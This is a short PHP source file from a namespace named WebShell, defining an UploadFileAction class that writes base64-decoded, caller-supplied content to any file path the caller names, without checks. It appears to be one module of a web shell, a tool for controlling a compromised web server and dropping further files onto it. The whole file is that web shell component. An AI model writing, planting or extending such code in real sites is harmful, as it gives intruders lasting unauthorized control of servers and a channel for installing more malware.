<?php
namespace WebShell;

class UploadFileAction implements Action
{
    public function run(array $args): string
    {
        // Create the target file
        $fd = fopen($args['filename'], 'w');

        // Decode the content and write it to the file
        $content = base64_decode($args['content']);
        fwrite($fd, $content);

        // Return an empty string
        return '';
    }
}
?>
